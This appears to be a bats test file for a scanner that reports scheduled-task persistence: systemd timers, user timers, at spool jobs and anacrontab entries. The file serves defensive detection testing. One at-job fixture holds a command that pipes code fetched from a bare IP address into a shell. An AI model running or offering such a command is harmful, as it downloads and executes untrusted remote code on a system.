#!/usr/bin/env bats
load ../helpers
setup() { src; reset_state; make_root; _PM=none; }

@test "a systemd timer unit under etc/systemd/system/*.timer is reported" {
  mkdir -p "$ROOT/etc/systemd/system"
  cat > "$ROOT/etc/systemd/system/backdoor.timer" <<'EOF'
[Timer]
OnCalendar=*:0/5
EOF
  check_scheduled
  emitted attention "backdoor.timer"
}

@test "a user systemd timer under home/<user>/.config/systemd/user/*.timer is reported" {
  mkdir -p "$ROOT/home/alice/.config/systemd/user"
  cat > "$ROOT/home/alice/.config/systemd/user/sneaky.timer" <<'EOF'
[Timer]
OnCalendar=hourly
EOF
  check_scheduled
  emitted attention "sneaky.timer"
}

@test "an at(1) spool job is reported" {
  mkdir -p "$ROOT/var/spool/cron/atjobs"
  cat > "$ROOT/var/spool/cron/atjobs/a0001a" <<'EOF'
#!/bin/sh
# atjob
curl http://5.9.1.2/x | sh
EOF
  check_scheduled
  emitted attention "a0001a"
}

@test "an anacrontab entry is reported" {
  mkdir -p "$ROOT/etc"
  cat > "$ROOT/etc/anacrontab" <<'EOF'
1  5  cron.daily  run-parts /etc/cron.daily
EOF
  check_scheduled
  emitted attention "anacrontab"
}
